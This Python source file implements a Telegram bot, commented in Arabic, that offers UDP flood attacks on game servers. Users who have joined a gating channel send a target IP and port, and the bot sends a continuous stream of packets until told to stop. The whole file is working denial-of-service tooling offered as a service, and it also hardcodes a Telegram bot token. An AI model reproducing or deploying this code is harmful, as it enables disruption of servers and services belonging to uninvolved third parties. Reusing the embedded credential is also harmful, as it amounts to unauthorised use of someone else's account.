import socket
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# إعدادات البوت والقناة
BOT_TOKEN = "7708899196:AAH1jQOz7UypkI6p0FWvsLQWdK7x4Rxr__E"
CHANNEL_ID = -1002444229316  # ضع هنا معرف القناة (مع الرقم السالب للقنوات الخاصة)
CHANNEL_LINK = "https://t.me/testmybotforb"  # ضع هنا رابط القناة

class UDPAttack:
    def __init__(self, target_ip, target_port, packet_size=1024):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_size = packet_size
        self.stop_flag = False

    async def send_udp_packets(self):
        message = b'\x00' * self.packet_size
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while not self.stop_flag:
            try:
                sock.sendto(message, (self.target_ip, self.target_port))
                await asyncio.sleep(0.001)  # التحكم في معدل الإرسال
            except Exception as e:
                print(f"خطأ أثناء إرسال حزمة UDP: {e}")
                break

        sock.close()

# دالة للتحقق من انضمام المستخدم إلى القناة
async def is_user_in_channel(user_id, bot):
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception as e:
        print(f"Error checking membership: {e}")
        return False

# التأكد من أن الرسالة ليست من مجموعة
def is_private_chat(message):
    return message.chat.type == "private"

# دالة لإضافة تأخير بين الرسائل
async def human_like_delay():
    await asyncio.sleep(1)  # تأخير لمدة ثانية بين الرسائل

# دالة لحذف الرسالة بعد فترة معينة
async def delete_message_after_delay(chat_id, message_id, delay, bot):
    await asyncio.sleep(delay)
    await bot.delete_message(chat_id=chat_id, message_id=message_id)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_private_chat(update.message):
        return  # تجاهل الرسائل الواردة من المجموعات
    
    user_id = update.message.from_user.id
    if await is_user_in_channel(user_id, context.bot):
        await update.message.reply_text(
            "*مرحبا*👽 ، *أنا بوت اقوم  بعمل أتاك على خوادم الالعاب* *🎮 عبر     تقنية UDP*\n\n"
             "قم بضغط على أمر :   /attack\n\n"
             "أو أمر :              /help  \n\n"
             "مطور البوت:          @l7l7aj",
            parse_mode="MarkdownV2"
        )
    else:
        msg = await update.message.reply_text(
            "عليك أولا الأنضمام الى المجوعة ✨️🙂:\n\n"
  
            f"[انقر هنا للانضمام]({CHANNEL_LINK})\n\n"
            
            "إنقر على /start\n\n",
            parse_mode="MarkdownV2"
        )
        # حذف الرسالة بعد 10 ثواني
        asyncio.create_task(delete_message_after_delay(update.message.chat_id, msg.message_id, 10, context.bot))

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_private_chat(update.message):
        return  # تجاهل الرسائل الواردة من المجموعات
    
    user_id = update.message.from_user.id
    if await is_user_in_channel(user_id, context.bot):
        await human_like_delay()
        await update.message.reply_text(
            "📜 *تعليمات الاستخدام:*\n\n"
            "1\. استخدم /attack لبدء الهجوم\.\n"
            "2\. أرسل الموجه مثل 23\.236\.112\.254:10018\.\n"
            "3\. سأرسل حزم UDP بسرعة عالية جدًا\.",
            parse_mode="MarkdownV2"
        )
    else:
        msg = await update.message.reply_text(
            "عليك أولا الأنضمام الى المجوعة ✨️🙂:\n\n"
  
            f"[انقر هنا للانضمام]({CHANNEL_LINK})\n\n"
            
            "إنقر على /start\n\n",
            parse_mode="MarkdownV2"
        )
        # حذف الرسالة بعد 10 ثواني
        asyncio.create_task(delete_message_after_delay(update.message.chat_id, msg.message_id, 10, context.bot))

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_private_chat(update.message):
        return  # تجاهل الرسائل الواردة من المجموعات
    
    user_id = update.message.from_user.id
    if await is_user_in_channel(user_id, context.bot):
        await human_like_delay()
        await update.message.reply_text(
            "🎮 *أدخل موجه الخادم* \(مثال: 23\.236\.112\.254:10018\):",
            parse_mode="MarkdownV2"
        )
        context.user_data['step'] = 'target'
    else:
        msg = await update.message.reply_text(
            "عليك أولا الأنضمام الى المجوعة ✨️🙂:\n\n"
  
            f"[انقر هنا للانضمام]({CHANNEL_LINK})\n\n"
            
            "إنقر على /start\n\n",
            parse_mode="MarkdownV2"
        )
        # حذف الرسالة بعد 10 ثواني
        asyncio.create_task(delete_message_after_delay(update.message.chat_id, msg.message_id, 10, context.bot))

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_private_chat(update.message):
        return  # تجاهل الرسائل الواردة من المجموعات
    
    user_id = update.message.from_user.id
    if not await is_user_in_channel(user_id, context.bot):
        msg = await update.message.reply_text(
            "عليك أولا الأنضمام الى المجوعة ✨️🙂:\n\n"
  
            f"[انقر هنا للانضمام]({CHANNEL_LINK})\n\n"
            
            "إنقر على /start\n\n",
            parse_mode="MarkdownV2"
        )
        # حذف الرسالة بعد 10 ثواني
        asyncio.create_task(delete_message_after_delay(update.message.chat_id, msg.message_id, 10, context.bot))
        return
    
    if 'step' in context.user_data:
        step = context.user_data['step']
        
        if step == 'target':
            try:
                target = update.message.text.split(':')
                if len(target) == 2:
                    target_ip = target[0]
                    target_port = int(target[1])
                    
                    context.user_data['ip'] = target_ip
                    context.user_data['port'] = target_port

                    await human_like_delay()
                    await update.message.reply_text(
                        f"⚡ *بدء الهجوم على* `{target_ip}:{target_port}` باستخدام UDP\.\.\.\n\n"
                        "سيتم إرسال الحزم بشكل مستمر حتى توقف الهجوم باستخدام /stop\.",
                        parse_mode="MarkdownV2"
                    )

                    attack_tool = UDPAttack(target_ip, target_port)
                    attack_task = asyncio.create_task(attack_tool.send_udp_packets())
                    context.user_data['attack_task'] = attack_task

                    context.user_data['step'] = 'attacking'

                else:
                    await update.message.reply_text(
                        "❌ *الرجاء إدخال الموجه بشكل صحيح* \(مثل: 23\.236\.112\.254:10018\)\.",
                        parse_mode="MarkdownV2"
                    )
                    context.user_data.clear()

            except ValueError:
                await update.message.reply_text(
                    "❌ *المنفذ يجب أن يكون رقمًا صحيحًا\.*",
                    parse_mode="MarkdownV2"
                )
                context.user_data.clear()

        elif step == 'attacking':
            await human_like_delay()
            await update.message.reply_text(
                "🚨 *الهجوم جاري حاليًا\.*",
                parse_mode="MarkdownV2"
            )
        
        elif step == 'stop':
            await update.message.reply_text(
                "❌ *الهجوم قد تم إيقافه مسبقًا\.*",
                parse_mode="MarkdownV2"
            )
            context.user_data.clear()

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_private_chat(update.message):
        return  # تجاهل الرسائل الواردة من المجموعات
    
    user_id = update.message.from_user.id
    if not await is_user_in_channel(user_id, context.bot):
        msg = await update.message.reply_text(
            "عليك أولا الأنضمام الى المجوعة ✨️🙂:\n\n"
  
            f"[انقر هنا للانضمام]({CHANNEL_LINK})\n\n"
            
            "إنقر على /start\n\n",
        )
        # حذف الرسالة بعد 10 ثواني
        asyncio.create_task(delete_message_after_delay(update.message.chat_id, msg.message_id, 10, context.bot))
        return
    
    if 'attack_task' in context.user_data:
        attack_task = context.user_data['attack_task']
        attack_task.cancel()
        await human_like_delay()
        await update.message.reply_text(
            "✅ *تم إيقاف الهجوم بنجاح\.*",
            parse_mode="MarkdownV2"
        )
        context.user_data.clear()
    else:
        await update.message.reply_text(
            "❌ *لم يتم بدء الهجوم بعد\.*",
            parse_mode="MarkdownV2"
        )

async def error(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(f"حدث خطأ: {context.error}")

def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    application.add_error_handler(error)

    application.run_polling()

if __name__ == "__main__":
    main()
